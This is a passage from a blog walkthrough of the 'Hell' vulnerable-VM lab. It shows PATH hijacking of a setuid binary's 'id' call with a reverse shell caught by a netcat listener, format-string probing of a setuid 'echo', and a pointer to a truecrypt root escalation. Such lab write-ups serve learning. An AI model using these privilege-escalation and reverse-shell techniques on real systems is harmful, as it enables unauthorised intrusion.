<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./part2
uid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1005<span style=color:#f92672>(</span>oj<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>developers<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1005<span style=color:#f92672>(</span>oj<span style=color:#f92672>)</span>,1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span>

Can<span style=color:#960050;background-color:#1e0010>&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
$
</code></pre></div><p>And, as expected, I spent some time on this binary too. I didn&rsquo;t expect <code>part2</code> to be any easier :P
After taking a break, I realized that the output that looks like that of <code>/usr/bin/id</code>, probably <strong>is</strong> that if it. So, off I went and did another <code>sha256sum</code>, type script, this time just with another reverse shell to port 4445, and naming it <code>id</code> so that part2 will pick it up:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ nc -l <span style=color:#ae81ff>4445</span>
$ /usr/bin/id
uid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>1005<span style=color:#f92672>(</span>oj<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>1003<span style=color:#f92672>(</span>developers<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1005<span style=color:#f92672>(</span>oj<span style=color:#f92672>)</span>,1004<span style=color:#f92672>(</span>bazza<span style=color:#f92672>)</span>

$ cd /home/oj
$ ls -lh
total 584K
-r-sr-xr-x <span style=color:#ae81ff>1</span> root root 579K Jul  <span style=color:#ae81ff>5</span> 21:12 echo
-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>154</span> Jul  <span style=color:#ae81ff>5</span> 21:06 How to be an infosec rockstar 101.txt
$
</code></pre></div><p>And there we are! Group membership for <code>oj</code>, and access to <code>/home/oj</code></p>
<h2 id=becoming-root>becoming root<a hidden class=anchor aria-hidden=true href=#becoming-root>#</a></h2>
<p>As with all of the other users, I added myself a ssh key for easy access.</p>
<p>Now, sadly I have to admit that this is as far as I have been able to come. <code>oj</code> has a binary called <code>echo</code> (not to be confused with the builtin echo), that, as expected, will echo what you input.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>oj@hell:~$ ./echo onetwothree
onetwothree
oj@hell:~$
</code></pre></div><p>I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a <a href=https://www.owasp.org/index.php/Format_string_attack>Format String Attack</a></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>oj@hell:~$ ./echo %08x.%08x.%08x
080488c0.bffffcf8.00000000
oj@hell:~$
</code></pre></div><p>I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.</p>
<p><strong>Edit:</strong> One way to root the machine is to make use of the fact that you can run <code>truecrypt</code> as <code>root</code>, and provide a evil container, spawning you a <code>root</code> shell. An example of this can be seen <a href=http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/>here</a> (and actually references this VM)</p>
<h2 id=summary>summary<a hidden class=anchor aria-hidden=true href=#summary>#</a></h2>
<p>Hell sure as heck taught me a lot and was one fun experience! Shoutout to <a href=https://twitter.com/@0x42424242>@0x42424242</a> for the time taken to make this VM available.</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/>
<span class=title>« Prev Page</span>
<br>
<span>flick can you find the flag?</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/>
<span class=title>Next Page »</span>
<br>
<span>Climbing the SkyTower</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Hell would just not freeze over! on twitter" href="https://twitter.com/intent/tweet/?text=Hell%20would%20just%20not%20freeze%20over%21&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hell would just not freeze over! on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f&title=Hell%20would%20just%20not%20freeze%20over%21&summary=Hell%20would%20just%20not%20freeze%20over%21&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hell would just not freeze over! on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f&title=Hell%20would%20just%20not%20freeze%20over%21"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hell would just not freeze over! on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hell would just not freeze over! on whatsapp" href="https://api.whatsapp.com/send?text=Hell%20would%20just%20not%20freeze%20over%21%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hell would just not freeze over! on telegram" href="https://telegram.me/share/url?text=Hell%20would%20just%20not%20freeze%20over%21&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f20%2fhell-would-just-not-freeze-over%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>